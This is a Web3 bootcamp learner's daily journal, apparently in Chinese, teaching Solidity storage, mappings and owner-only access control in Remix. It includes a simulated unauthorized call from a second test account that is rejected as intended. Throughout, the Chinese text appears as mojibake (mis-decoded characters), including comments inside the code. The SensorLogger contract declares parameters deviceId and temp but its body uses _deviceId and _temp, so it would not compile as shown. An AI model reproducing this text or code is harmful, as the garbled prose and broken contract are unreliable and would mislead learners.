é€šå¸¸åœ¨è¿™é‡Œè®°å½•â€œè°æ˜¯å‡ºå‚ç®¡ç†å‘˜â€ã€‚

### B. å…¨å±€å˜é‡ (msg.sender) = Current\_Task\_PID

åœ¨ RTOS ä¸­ï¼Œé€šè¿‡ osThreadGetId() çŸ¥é“å½“å‰æ˜¯è°åœ¨æ‰§è¡Œä»£ç ã€‚ åœ¨ Solidity ä¸­ï¼Œmsg.sender æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œä»£è¡¨**å½“å‰æ­£åœ¨è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„åœ°å€**ã€‚

-   å¦‚æœæ˜¯ä½ è°ƒç”¨çš„ï¼Œå®ƒå°±æ˜¯ä½ çš„é’±åŒ…åœ°å€ã€‚
    
-   å¦‚æœæ˜¯é»‘å®¢è°ƒç”¨çš„ï¼Œå®ƒå°±æ˜¯é»‘å®¢çš„åœ°å€ã€‚
    

### C. ä¿®é¥°ç¬¦ (modifier) = ASSERT å® / ä¸­é—´ä»¶

è¿™æ˜¯ Solidity æœ€ä¼˜é›…çš„ç‰¹æ€§ä¹‹ä¸€ã€‚å®ƒç±»ä¼¼äº C è¯­è¨€çš„é¢„å¤„ç†å®ï¼Œæˆ–è€…æ˜¯ AOPï¼ˆé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼‰ã€‚ æˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€ä¸ªè§„åˆ™ï¼ˆæ¯”å¦‚â€œå¿…é¡»æ˜¯ç®¡ç†å‘˜â€ï¼‰ï¼Œç„¶åæŠŠè¿™ä¸ªæ ‡ç­¾è´´åœ¨ä»»ä½•å‡½æ•°å¤´ä¸Šã€‚å‡½æ•°æ‰§è¡Œå‰ï¼Œä¼šå…ˆè·‘è¿™ä¸ªè§„åˆ™ã€‚

## 2\. ä»£ç å®æˆ˜ï¼šåŠ ä¸Šâ€œé˜²ç›—é”â€

å°†ä¿®æ”¹ SensorLoggerï¼Œå¢åŠ ä¸€ä¸ªç®¡ç†å‘˜ ownerï¼Œå¹¶ä¸”åªå…è®¸ owner å†™å…¥æ•°æ®ã€‚

**è¯·åœ¨ Remix ä¸­æ–°å»º Day4\_AccessControl.solï¼Œè¾“å…¥ä»¥ä¸‹ä»£ç ï¼š**

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AccessControlSensor {
    
    // 1. å®šä¹‰ç®¡ç†å‘˜å˜é‡ (å­˜åœ¨ Flash/Storage ä¸­)
    address public owner;

    struct SensorData {
        uint16 temperature;
        bool isValid;
    }
    mapping(uint256 => SensorData) public sensors;

    // --- å¯åŠ¨ä»£ç  (Bootloader) ---
    // ä»…åœ¨éƒ¨ç½²ç¬é—´æ‰§è¡Œä¸€æ¬¡
    constructor() {
        // msg.sender åœ¨è¿™é‡Œä»£è¡¨â€œéƒ¨ç½²è€…â€ (ä¹Ÿå°±æ˜¯æ‚¨)
        owner = msg.sender; 
    }

    // --- å®šä¹‰ä¿®é¥°ç¬¦ (å®æ£€æŸ¥) ---
    modifier onlyOwner() {
        // [Check] æ£€æŸ¥å½“å‰è°ƒç”¨è€…æ˜¯ä¸æ˜¯ç®¡ç†å‘˜
        require(msg.sender == owner, "Error: You are not the admin!");
        
        // [Merge] ä¸‹åˆ’çº¿ä»£è¡¨â€œè¢«ä¿®é¥°å‡½æ•°çš„ä»£ç ä½“â€
        // ä¹Ÿå°±æ˜¯å…ˆæ‰§è¡Œä¸Šé¢çš„ requireï¼Œé€šè¿‡åï¼Œå†æŠŠåŸæ¥çš„å‡½æ•°ä½“å¡«åœ¨è¿™é‡Œæ‰§è¡Œ
        _; 
    }

    // --- å†™å…¥å‡½æ•° (åŠ ä¸Šäº†é”) ---
    // æ³¨æ„å¤´éƒ¨å¤šäº† 'onlyOwner' å…³é”®å­—
    function updateData(uint256 _id, uint16 _temp) public onlyOwner {
        sensors[_id] = SensorData(_temp, true);
    }

    // --- ä»»ä½•äººéƒ½å¯ä»¥è¯»å– ---
    function getTemp(uint256 _id) public view returns (uint16) {
        return sensors[_id].temperature;
    }
}
```

## 3\. æ”»å‡»æ¨¡æ‹Ÿå®éªŒ (æ ¸å¿ƒç¯èŠ‚)

è¿™æ¬¡æˆ‘ä»¬ä¸èƒ½åªç‚¹ä¸€ä¸‹å°±å®Œäº†ï¼Œæˆ‘ä»¬è¦æ¨¡æ‹Ÿâ€œèº«ä»½åˆ‡æ¢â€ã€‚Remix æä¾›äº†å¤šä¸ªè™šæ‹Ÿè´¦æˆ·ï¼Œéå¸¸é€‚åˆåšè¿™ä¸ªæµ‹è¯•ã€‚

## ç¬¬ä¸€æ­¥ï¼šéƒ¨ç½² (æˆ‘æ˜¯ç®¡ç†å‘˜)

1.  ç¡®ä¿ **Account** æ é€‰ä¸­çš„æ˜¯ç¬¬ä¸€ä¸ªåœ°å€ï¼ˆæ¯”å¦‚ 0x5B3...ï¼‰ã€‚
    
2.  ç‚¹å‡» **Deploy**ã€‚
    
3.  å±•å¼€åˆçº¦ï¼Œç‚¹å‡» owner æŒ‰é’®ã€‚ ç¡®è®¤æ˜¾ç¤ºçš„åœ°å€å’Œä¸Šé¢ Account æ é‡Œçš„åœ°å€ä¸€æ¨¡ä¸€æ ·ã€‚
    

## ç¬¬äºŒæ­¥ï¼šæ­£å¸¸å†™å…¥ (æˆæƒæ“ä½œ)

1.  ä¿æŒ Account ä¸å˜ã€‚
    
2.  åœ¨ updateData è¾“å…¥ 1, 2550ã€‚
    
3.  ç‚¹å‡» transactã€‚ **ç»“æœï¼š** äº¤æ˜“æˆåŠŸï¼ˆæ§åˆ¶å°ç»¿è‰²å¯¹å‹¾ï¼‰ã€‚
    

## ç¬¬ä¸‰æ­¥ï¼šé»‘å®¢æ”»å‡» (æœªæˆæƒæ“ä½œ)

1.  **åˆ‡æ¢è´¦å·ï¼š** åœ¨å·¦ä¾§ **Account** ä¸‹æ‹‰èœå•ä¸­ï¼Œé€‰æ‹©**ç¬¬äºŒä¸ªåœ°å€**ï¼ˆæ¯”å¦‚ 0xAb8...ï¼‰ã€‚ _æ­¤æ—¶æ‚¨æ‰®æ¼”äº†ä¸€ä¸ªè·¯äºº/é»‘å®¢ã€‚_
    
2.  å†æ¬¡ç‚¹å‡» updateData (è¾“å…¥ 1, 9999)ã€‚ **ç»“æœï¼š** äº¤æ˜“**å¤±è´¥**ï¼æ§åˆ¶å°å‡ºç°çº¢è‰²æŠ¥é”™ã€‚
    
3.  **æŸ¥çœ‹æŠ¥é”™åŸå› ï¼š** åœ¨æ§åˆ¶å°æŠ¥é”™ä¿¡æ¯ä¸­ï¼Œå¯»æ‰¾ Reason: Error: You are not the admin!ã€‚ è¿™æ­£æ˜¯æˆ‘ä»¬åœ¨ require é‡Œå†™çš„æŠ¥é”™å­—ç¬¦ä¸²ã€‚
    

4\. æ·±åº¦å¤ç›˜

åšå®Œå®éªŒåï¼Œè¯·æ€è€ƒè¿™ä¸ª modifier çš„æ‰§è¡Œæµï¼š

å½“é»‘å®¢è°ƒç”¨ updateData æ—¶ï¼Œå®é™…å‘ç”Ÿçš„æ‰§è¡Œé¡ºåºæ˜¯ï¼š

1.  è¿›å…¥ onlyOwner ä¿®é¥°ç¬¦ã€‚
    
2.  æ‰§è¡Œ require(msg.sender == owner)ã€‚ msg.sender æ˜¯é»‘å®¢åœ°å€ (0xAb8...)ã€‚ owner æ˜¯ç®¡ç†å‘˜åœ°å€ (0x5B3...)ã€‚ **ä¸ç›¸ç­‰ -> æŠ›å‡ºå¼‚å¸¸ -> çŠ¶æ€å›æ»šã€‚**
    
3.  **æ ¹æœ¬æ²¡æœ‰æ‰§è¡Œåˆ°** sensors\[\_id\] = ... è¿™ä¸€è¡Œã€‚æ•°æ®å¾—åˆ°äº†å®Œç¾ä¿æŠ¤ã€‚
    

![å±å¹•æˆªå›¾ 2026-01-15 224301.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-15-1768489356926-_____2026-01-15_224301.png)![å±å¹•æˆªå›¾ 2026-01-15 221308.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-15-1768489330308-_____2026-01-15_221308.png)

**ä»Šæ—¥ä½œä¸šï¼š**å¦‚æœæ‚¨æƒ³æŠŠæƒé™ç§»äº¤ç»™åˆ«äººï¼ˆæ¯”å¦‚æŠŠè®¾å¤‡å–ç»™äº†å®¢æˆ·ï¼‰ï¼Œåº”è¯¥æ€ä¹ˆå†™ï¼Ÿ _è¯•ç€æ·»åŠ ä¸€ä¸ª function changeOwner(address newOwner) å‡½æ•°ã€‚_ _æç¤ºï¼šè¿™ä¸ªå‡½æ•°æœ¬èº«ä¹Ÿéœ€è¦åŠ  onlyOwner å—ï¼Ÿå¦‚æœä¸åŠ ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ_

### ç­”ï¼šç‰ˆæœ¬ Aï¼šç›´çƒç‰ˆ (C è¯­è¨€æ€ç»´)

è¿™æ˜¯æœ€ç›´æ¥çš„å®ç°ï¼Œç±»ä¼¼äº C è¯­è¨€ä¸­çš„æŒ‡é’ˆé‡æ–°èµ‹å€¼ã€‚

**âš ï¸ è¿™ç§å†™æ³•çš„é£é™©ï¼ˆåµŒå…¥å¼ç±»æ¯”ï¼‰ï¼š** è¿™å°±åƒé€šè¿‡ä¸²å£å‘é€ä¸€æ¡æŒ‡ä»¤ä¿®æ”¹æ³¢ç‰¹ç‡ã€‚å¦‚æœæ‰‹æŠ–æŠŠæ³¢ç‰¹ç‡æ”¹æˆäº†ä¹±ç ï¼Œç”±äºé€šä¿¡å·²ç»æ–­å¼€ï¼Œ**å†ä¹Ÿæ— æ³•**å‘æŒ‡ä»¤æ”¹å›å»äº†ã€‚è®¾å¤‡ç›´æ¥å˜ç –ã€‚ åŒç†ï¼Œå¦‚æœæ‚¨æŠŠ `_newOwner` è¾“é”™äº†ä¸€ä½ï¼Œæˆ–è€…è¾“æˆäº†ä¸€ä¸ªæ²¡äººæ§åˆ¶çš„åœ°å€ï¼Œåˆçº¦çš„ç®¡ç†å‘˜æƒé™å°±**æ°¸ä¹…ä¸¢å¤±**äº†ã€‚

**é€»è¾‘ï¼š**

1.  æ£€æŸ¥è°ƒç”¨è€…æ˜¯ä¸æ˜¯ç°ä»»ç®¡ç†å‘˜ (`onlyOwner`)ã€‚
    
2.  æ£€æŸ¥æ–°åœ°å€æ˜¯ä¸æ˜¯â€œç©ºæŒ‡é’ˆâ€ (`address(0)`)ã€‚
    
3.  ç›´æ¥è¦†ç›– `owner` å˜é‡ã€‚
    

```
// åœ¨æ‚¨çš„ AccessControlSensor åˆçº¦ä¸­æ·»åŠ ï¼š

function changeOwner(address _newOwner) public onlyOwner {
    // [Check] é˜²æ­¢æ‰‹æŠ–æŠŠæƒé™è½¬ç»™ 0x0000...0000 (ç©ºåœ°å€)
    require(_newOwner != address(0), "New owner is the zero address");

    // [Effect] ç«‹å³ç§»äº¤æƒé™
    owner = _newOwner;
}
```

### ç‰ˆæœ¬ Bï¼šä¸¤æ­¥éªŒè¯æ³• (Web3 / Rust å®‰å…¨æ€ç»´)

è¿™æ˜¯æ‚¨æƒ³è¦çš„â€œæ›´å¥½çš„å»ºè®®â€ã€‚åœ¨ Rust ä¸­ï¼Œæ‰€æœ‰æƒï¼ˆOwnershipï¼‰çš„è½¬ç§»æ˜¯éå¸¸ä¸¥è°¨çš„ã€‚åœ¨ Web3 æ™ºèƒ½åˆçº¦ä¸­ï¼Œä¸ºäº†é˜²æ­¢â€œå˜ç –â€ï¼Œæˆ‘ä»¬é‡‡ç”¨ **"Offer - Accept" (æè®®-æ¥å—)** æ¨¡å¼ã€‚

**åµŒå…¥å¼ç±»æ¯”ï¼š** è¿™å°±åƒ TCP çš„ **ä¸‰æ¬¡æ¡æ‰‹**ï¼Œæˆ–è€… SPI é€šä¿¡ä¸­çš„ **Master-Slave æ¡æ‰‹**ã€‚

1.  **Master (ç°ä»»ç®¡ç†å‘˜):** â€œæˆ‘æƒ³æŠŠ Master æƒé™ç»™ä»æœº Bã€‚â€ (å‘é€è¯·æ±‚)
    
2.  **Slave B (æ–°ç®¡ç†å‘˜):** â€œæ”¶åˆ°ï¼Œæˆ‘ç¡®è®¤æ¥ç®¡ã€‚â€ (å‘é€ ACK)
    
3.  **ç³»ç»Ÿ:** â€œæƒé™ç§»äº¤å®Œæˆã€‚â€
    

å¦‚æœ Slave B æ²¡æœ‰å“åº”ï¼ˆåœ°å€è¾“é”™/ç§é’¥ä¸¢å¤±ï¼‰ï¼Œæƒé™**ä»ç„¶ä¿ç•™åœ¨ Master æ‰‹é‡Œ**ï¼Œç³»ç»Ÿä¸ä¼šæŒ‚æ‰ã€‚

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SafeAccessControl {
    address public owner;
    address public pendingOwner; // æš‚å­˜çš„æ–°ç®¡ç†å‘˜åœ°å€

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // --- æ­¥éª¤ 1: ç°ä»»ç®¡ç†å‘˜å‘èµ·ç§»äº¤ ---
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0), "Unsafe address");
        // è¿™é‡Œä¸ç›´æ¥æ”¹ ownerï¼Œè€Œæ˜¯ç»™ pendingOwner èµ‹å€¼
        pendingOwner = _newOwner;
    }

    // --- æ­¥éª¤ 2: æ–°ç®¡ç†å‘˜ç¡®è®¤æ¥æ”¶ ---
    // è¿™ä¸ªå‡½æ•°å¿…é¡»ç”± _newOwner äº²è‡ªè°ƒç”¨
    function acceptOwnership() public {
        // [Check] æ£€æŸ¥è°ƒç”¨è€…æ˜¯ä¸æ˜¯è¢«æŒ‡å®šçš„æ¥ç­äºº
        require(msg.sender == pendingOwner, "You are not the pending owner");
        
        // [Effect] æ­£å¼ç§»äº¤
        owner = pendingOwner;
        pendingOwner = address(0); // æ¸…ç©ºæš‚å­˜åŒº
    }
}
```

-   **éƒ¨ç½²** `SafeAccessControl` (ä½¿ç”¨è´¦å· A)ã€‚
    
-   **å‘èµ·ç§»äº¤ (transferOwnership):**
    
    -   ä½¿ç”¨è´¦å· Aã€‚
        
    -   è¾“å…¥è´¦å· B çš„åœ°å€ã€‚
        
    -   ç‚¹å‡» transactã€‚
        
    -   _æ­¤æ—¶æŸ¥çœ‹_ `owner`_ï¼Œä»ç„¶æ˜¯è´¦å· Aã€‚_
        
-   **é»‘å®¢å°è¯•æˆªèƒ¡ (æ¨¡æ‹Ÿ):**
    
    -   åˆ‡æ¢åˆ°è´¦å· Cã€‚
        
    -   ç‚¹å‡» `acceptOwnership`ã€‚
        
    -   _ç»“æœï¼šæŠ¥é”™ "You are not the pending owner"ã€‚_
        
-   **æ¥å—ç§»äº¤ (acceptOwnership):**
    
    -   åˆ‡æ¢åˆ°è´¦å· B (å¿…é¡»æ˜¯åˆšæ‰æŒ‡å®šçš„é‚£ä¸ª)ã€‚
        
    -   ç‚¹å‡» `acceptOwnership`ã€‚
        
    -   _æ­¤æ—¶æŸ¥çœ‹_ `owner`_ï¼Œå˜æˆäº†è´¦å· Bã€‚_
        

![å±å¹•æˆªå›¾ 2026-01-15 224301.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-15-1768489534376-_____2026-01-15_224301.png)

### ä¸ºä»€ä¹ˆè¯´è¿™æ˜¯ Rust æ€ç»´ï¼Ÿ

åœ¨ Rust è¯­è¨€ä¸­ï¼Œèµ„æºçš„æ‰€æœ‰æƒç®¡ç†æå…¶ä¸¥æ ¼ã€‚ä½ ä¸èƒ½éšä¾¿æŠŠä¸€ä¸ªå˜é‡çš„æ‰€æœ‰æƒâ€œæ‰”â€ç»™åˆ«äººï¼Œå¿…é¡»ç¡®ä¿ä½œç”¨åŸŸçš„å®‰å…¨æ€§ã€‚ è¿™ç§ **Two-Step Transfer** æ¨¡å¼ä½“ç°äº† Rust çš„ **Explicit ensures Safety (æ˜¾å¼å³å®‰å…¨)** å“²å­¦ï¼š

-   **ä¸éšå¼å‘ç”Ÿï¼š** é‡è¦çš„çŠ¶æ€å˜æ›´å¿…é¡»æœ‰æ˜¾å¼çš„â€œæ¥å—â€åŠ¨ä½œã€‚
    
-   **æ•…éšœå®‰å…¨ (Fail-safe)ï¼š** å¦‚æœä¸­é—´ä»»ä½•ä¸€æ­¥å‡ºé”™ï¼Œç³»ç»Ÿå›é€€åˆ°åŸæœ‰çš„å®‰å…¨çŠ¶æ€ï¼ˆæ—§ç®¡ç†å‘˜ä¾ç„¶æ‹¥æœ‰æƒé™ï¼‰ï¼Œè€Œä¸æ˜¯è¿›å…¥æœªå®šä¹‰çš„ Panic çŠ¶æ€ã€‚
<!-- DAILY_CHECKIN_2026-01-15_END -->

# 2026-01-14
<!-- DAILY_CHECKIN_2026-01-14_START -->

















# ç¬¬ä¸‰å¤© **ï¼šSolidityè¯­æ³•ä¸æ ¸å¿ƒæ•°æ®ç»“æ„**ã€‚

å¯¹äºC è¯­è¨€è€æ‰‹æ¥è¯´ï¼Œå­¦ä¹  Solidity çš„è¯­æ³•å°±åƒæ˜¯æ¢äº†ä¸€ç§æ–¹è¨€ï¼Œå¤§ä½“é€»è¾‘æ˜¯é€šçš„ï¼Œä½†æœ‰å‡ ä¸ªéå¸¸åç›´è§‰çš„â€œå†…å­˜é™·é˜±â€éœ€è¦ç‰¹åˆ«æ³¨æ„ã€‚

ä»Šå¤©çš„ç›®æ ‡æ˜¯ï¼š**ç¼–å†™ä¸€ä¸ªå·¥ä¸šçº§çš„â€œä¼ æ„Ÿå™¨æ•°æ®ä¸Šé“¾â€åˆçº¦ã€‚**

## **ç†è®ºæ˜ å°„ï¼šä¸‰å¤§å­˜å‚¨ç©ºé—´ (The Data Location)**

åœ¨ STM32 ä¸­ï¼Œæ•°æ®æ˜¯æ”¾åœ¨ Flashï¼ˆåªè¯»/æŒä¹…åŒ–ï¼‰ã€SRAMï¼ˆè¯»å†™/æ˜“å¤±ï¼‰è¿˜æ˜¯å¯„å­˜å™¨é‡Œã€‚ åœ¨ Solidity ä¸­ï¼Œå¿…é¡»**æ˜¾å¼å£°æ˜**å˜é‡å­˜å‚¨åœ¨ä»¥ä¸‹ä¸‰ä¸ªåŒºåŸŸä¹‹ä¸€ï¼Œå¦åˆ™ç¼–è¯‘å™¨ä¼šæŠ¥é”™ã€‚è¿™æ˜¯å®ƒå’Œ Python/JS æœ€å¤§çš„ä¸åŒã€‚

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-14-1768405004145-image.png)

**åµŒå…¥å¼æ€ç»´è½¬æ¢ï¼š**

-   **storage å°±æ˜¯å†™ Flashã€‚** å®ƒæ˜¯çŠ¶æ€å˜é‡çš„é»˜è®¤ä½ç½®ã€‚æ°¸è¿œä¸è¦ä¸ºäº†ä¸´æ—¶è®¡ç®—è€Œåœ¨ storage é‡Œè¯»å†™ï¼Œé‚£ä¼šè®©æ‚¨çš„ç”¨æˆ·ç ´äº§ã€‚
    
-   **memory å°±æ˜¯å±€éƒ¨å˜é‡ã€‚** åœ¨å‡½æ•°å†…éƒ¨å®šä¹‰çš„å¤æ‚ç±»å‹ï¼ˆå¦‚ç»“æ„ä½“ã€æ•°ç»„ï¼‰éœ€è¦åŠ  memory å…³é”®å­—ã€‚
    

## æ ¸å¿ƒæ•°æ®ç»“æ„ï¼šMapping (æ˜ å°„) vs Array

æˆ‘ä¹ æƒ¯ç”¨ SensorData logs\[100\]ï¼ˆæ•°ç»„ï¼‰ã€‚ ä½†åœ¨åŒºå—é“¾ä¸Šï¼Œæ•°ç»„éå¸¸å±é™©ï¼ˆGas æ¶ˆè€—éšé•¿åº¦çº¿æ€§å¢åŠ ï¼‰ï¼Œæ‰€ä»¥æ”¹ç”¨ä¸º**mapping**ã€‚

-   **å®šä¹‰ï¼š** mapping(KeyType => ValueType)
    
-   **æœ¬è´¨ï¼š** ä¸€ä¸ªå·¨å¤§çš„**å“ˆå¸Œè¡¨ (Hash Table)**ã€‚
    
-   **æ€ªç™–ï¼ˆä¸ C çš„æœ€å¤§åŒºåˆ«ï¼‰ï¼š**
    
    1.  **æ²¡æœ‰é•¿åº¦ï¼š æ— æ³•è·å– mapping.lengthã€‚**
        
    2.  **æ— æ³•éå†ï¼š ä¸èƒ½å†™ for (i in mapping)ã€‚å¿…é¡»çŸ¥é“ Key æ‰èƒ½æ‹¿åˆ° Valueã€‚**
        
    3.  **å…¨ç©ºé—´åˆå§‹åŒ–ï¼š å®ƒçš„é€»è¾‘ç©ºé—´åŒ…å«æ‰€æœ‰å¯èƒ½çš„ Keyã€‚è®¿é—®ä¸€ä¸ªä»æœªå†™å…¥çš„ Keyï¼Œä¸ä¼šæŠ¥é”™ï¼Œä¹Ÿä¸ä¼šè¯»åˆ°åƒåœ¾å€¼ï¼Œè€Œæ˜¯è¿”å› å…¨0 (é»˜è®¤å€¼)ã€‚**
        

## **ä»£ç å®æˆ˜ï¼šç¼–å†™ SensorLogger åˆçº¦**

```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

Â 

contract SensorLogger {

Â Â Â 

Â Â Â  // --- 1. æ•°æ®ç»“æ„å®šä¹‰ (ç±»ä¼¼äº struct) ---

Â Â Â  struct SensorData {

Â Â Â Â Â Â Â  uint8 id;Â Â Â Â Â Â Â Â Â Â  // ä¼ æ„Ÿå™¨ID (uint8: 0-255)

Â Â Â Â Â Â Â  uint16 temperature; // æ¸©åº¦ (å®šç‚¹æ•°: 2550 ä»£è¡¨ 25.50åº¦)

Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  // æ³¨æ„: Solidity æ²¡æœ‰ float/double ç±»å‹ï¼å¿…é¡»ç”¨æ•´æ•°è¡¨ç¤ºã€‚

Â Â Â Â Â Â Â  uint32 timestamp;Â Â  // UNIX æ—¶é—´æˆ³

Â Â Â Â Â Â Â  bool isValid;Â Â Â Â Â Â  // çŠ¶æ€æ ‡å¿—ä½

Â Â Â  }

Â 

Â Â Â  // --- 2. æ°¸ä¹…å­˜å‚¨åŒº (Flash / Storage) ---

Â Â Â  // è¿™æ˜¯ä¸€ä¸ªå“ˆå¸Œè¡¨ï¼šè®¾å¤‡ID (Key) -> ä¼ æ„Ÿå™¨æ•°æ® (Value)

Â Â Â  // 'public' å…³é”®å­—ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ª getter å‡½æ•°

Â Â Â  mapping(uint256 => SensorData) public sensors;

Â 

Â Â Â  // --- 3. å†™å…¥å‡½æ•° (Flash Write) ---

Â Â Â  function updateData(uint256 deviceId, uint16 temp) public {

Â Â Â Â Â Â Â  // [Check] ç®€å•çš„å‚æ•°æ£€æŸ¥

Â Â Â Â Â Â Â  require(_deviceId > 0, "Invalid Device ID");

Â 

Â Â Â Â Â Â Â  // [Effects] å†™å…¥ Storage

Â Â Â Â Â Â Â  // block.timestamp æ˜¯å½“å‰åŒºå—çš„æ—¶é—´ (ç±»ä¼¼äº RTC æ—¶é—´)

Â Â Â Â Â Â Â  sensors[_deviceId] = SensorData({

Â Â Â Â Â Â Â Â Â Â Â  id: uint8(_deviceId),

Â Â Â Â Â Â Â Â Â Â Â  temperature: _temp,

Â Â Â Â Â Â Â Â Â Â Â  timestamp: uint32(block.timestamp),

Â Â Â Â Â Â Â Â Â Â Â  isValid: true

Â Â Â Â Â Â Â  });

Â Â Â  }

Â 

Â Â Â  // --- 4. è¯»å–å‡½æ•° (Flash Read) ---

Â Â Â  // 'view' è¡¨ç¤ºåªè¯»ï¼Œä¸ä¿®æ”¹çŠ¶æ€ã€‚

Â Â Â  // å¦‚æœæ˜¯å¤–éƒ¨(User)ç›´æ¥è°ƒç”¨ï¼Œä¸æ¶ˆè€— Gasã€‚å¦‚æœæ˜¯åˆçº¦å†…éƒ¨è°ƒç”¨ï¼Œæ¶ˆè€—æå°‘ Gasã€‚

Â Â Â  function getTemperature(uint256 _deviceId) public view returns (uint16) {

Â Â Â Â Â Â Â  // ä» Storage è¯»å–æ•°æ®åˆ° Memory (RAM)

Â Â Â Â Â Â Â  SensorData memory data = sensors[_deviceId];

Â Â Â Â Â Â Â 

Â Â Â Â Â Â Â  // æ£€æŸ¥æ•°æ®æ˜¯å¦æœ‰æ•ˆ (ç±»ä¼¼äºæ£€æŸ¥ Flash é‡Œçš„ Magic Number)

Â Â Â Â Â Â Â  if (data.isValid) {

Â Â Â Â Â Â Â Â Â Â Â  return data.temperature;

Â Â Â Â Â Â Â  } else {

Â Â Â Â Â Â Â Â Â Â Â  return 0; // æˆ–è€…æŠ›å‡ºé”™è¯¯

Â Â Â Â Â Â Â  }

Â Â Â  }

}
```

## éƒ¨ç½²ä¸å®éªŒ

**ç¯å¢ƒé€‰æ‹©ï¼š** ä¾ç„¶ä½¿ç”¨ **Remix VM (Cancun)**ï¼Œé€Ÿåº¦å¿«ã€‚

1.  **Compile (ç¼–è¯‘): ç¡®ä¿ç»¿è‰²å¯¹å‹¾ã€‚**
    
2.  **Deploy (éƒ¨ç½²): ç‚¹å‡»æ©™è‰² Deploy æŒ‰é’®ã€‚**
    
3.  **å±•å¼€åˆçº¦ è¿›è¡Œäº¤äº’ï¼š**
    

**å®éªŒ Aï¼šå†™å…¥æ•°æ® (Update)**

-   æ‰¾åˆ° updateData å‡½æ•°ã€‚
    
-   \_deviceId: è¾“å…¥ 101ã€‚
    
-   \_temp: è¾“å…¥ 2550 (ä»£è¡¨ 25.50 åº¦)ã€‚
    
-   ç‚¹å‡» **transact**ã€‚
    
-   _è§‚å¯Ÿæ§åˆ¶å°ï¼š_ åªæœ‰å†™å…¥æ“ä½œæ‰ä¼šæ¶ˆè€— Gasã€‚
    

**å®éªŒ Bï¼šè¯»å–æ•°æ® (Read)**

-   æ‰¾åˆ° sensors æŒ‰é’®ï¼ˆè¿™æ˜¯ public mapping è‡ªåŠ¨ç”Ÿæˆçš„ï¼‰ã€‚
    
-   è¾“å…¥ 101ï¼Œç‚¹å‡» callã€‚
    
    -   ä¹‹åä¼šçœ‹åˆ°è¿”å›çš„ tuple æ•°æ®ï¼šID, temp, timestamp, trueã€‚
        
-   æ‰¾åˆ° getTemperature æŒ‰é’®ã€‚
    
-   è¾“å…¥ 101ï¼Œç‚¹å‡» callã€‚
    
    -   è¿”å› 2550ã€‚
        

**å®éªŒ Cï¼šè®¿é—®æœªåˆå§‹åŒ–çš„å†…å­˜ (å…³é”®ï¼)**

-   åœ¨ getTemperature ä¸­è¾“å…¥ 999 (ä¸€ä¸ªä»æœªå†™è¿‡çš„ ID)ã€‚
    
-   ç‚¹å‡» callã€‚
    
-   **é—®é¢˜ï¼š** å®ƒè¿”å›äº†ä»€ä¹ˆï¼Ÿæ˜¯æŠ¥é”™äº†ï¼Œè¿˜æ˜¯ä¹±ç ï¼Œè¿˜æ˜¯ 0ï¼Ÿ
    

**æ€è€ƒé¢˜ï¼š** è¿™æ¬¡å†™å…¥å¤§æ¦‚æ¶ˆè€—äº†å¤šå°‘ Gasï¼Ÿï¼ˆé€šå¸¸æ˜¯ **4ä¸‡åˆ°5ä¸‡** å·¦å³ï¼‰ã€‚ å¯¹æ¯”ä¸€ä¸‹æ˜¨å¤©é‚£ä¸ªç®€å•çš„ `counter++`ï¼ˆçº¦ 2ä¸‡å¤šï¼‰ï¼Œä¸ºä»€ä¹ˆè¿™æ¬¡è´µäº†è¿™ä¹ˆå¤šï¼Ÿ

-   _æç¤ºï¼šæ˜¨å¤©åªæ˜¯ä¿®æ”¹äº†ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ•´æ•°ï¼Œä»Šå¤©æ˜¯_**_ç¬¬ä¸€æ¬¡_**_ä¸ºä¸€ä¸ªæ–°çš„ Key (_`101`_) åˆå§‹åŒ–ç»“æ„ä½“ï¼Œç›¸å½“äºåœ¨ Flash ä¸Šå¼€è¾Ÿäº†ä¸€å—æ–°æ‰‡åŒºï¼Œè¿™æ˜¯æœ€è´µçš„æ“ä½œã€‚_
    

å›ç­”ï¼š

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-14-1768405228350-image.png)![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-14-1768405200798-image.png)

### å›°æƒ‘ä¸€ï¼š`call sensors` çš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯ç”Ÿæˆ ID å—ï¼Ÿ

**ç­”æ¡ˆï¼šä¸æ˜¯ç”Ÿæˆï¼Œè€Œæ˜¯â€œç›´è¯»å†…å­˜â€ã€‚**

-   **ç°è±¡ï¼š** æ‚¨æ²¡æœ‰å†™ `function sensors()...` è¿™ä¸ªå‡½æ•°ï¼Œä½† Remix é‡Œå´å‡ºç°äº†ä¸€ä¸ªè“è‰²çš„ `sensors` æŒ‰é’®ã€‚
    
